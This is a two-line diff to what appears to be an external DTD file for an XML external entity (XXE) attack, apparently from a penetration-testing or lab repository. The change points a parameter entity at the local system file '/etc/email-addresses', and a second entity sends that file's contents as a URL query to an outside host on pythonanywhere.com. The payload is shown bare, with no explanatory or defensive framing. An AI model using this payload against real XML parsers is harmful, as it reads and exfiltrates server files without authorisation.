@@ -1,2 +1,2 @@
-<!ENTITY % payl SYSTEM "file:///etc/">
+<!ENTITY % payl SYSTEM "file:///etc/email-addresses">
 <!ENTITY % intern "<!ENTITY &#x25; xxe SYSTEM 'http://westpent.pythonanywhere.com/K?%payl;'>">
